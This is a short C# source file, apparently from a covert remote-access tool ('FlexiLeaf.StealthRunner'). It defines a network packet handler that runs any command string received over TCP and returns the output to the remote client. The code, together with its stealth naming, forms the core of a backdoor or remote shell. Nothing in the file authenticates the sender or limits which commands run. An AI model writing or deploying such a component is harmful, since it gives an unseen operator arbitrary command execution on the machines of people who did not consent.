using FlexiLeaf.Core;
using FlexiLeaf.Core.Network;
using FlexiLeaf.Core.Network.Packets;

namespace FlexiLeaf.StealthRunner.Handlers
{
    public static class CommandHandlers
    {
        private static CommandExecutor executor = new CommandExecutor();

        [PacketHandler]
        public static async void ExecuteCommandResponce(CommandPacket packet, TcpClient client)
        {
            string command = packet.Command;
            packet.Command = executor.ExecuteCommand(command);
            await client.Send(packet);
        }

    }
}
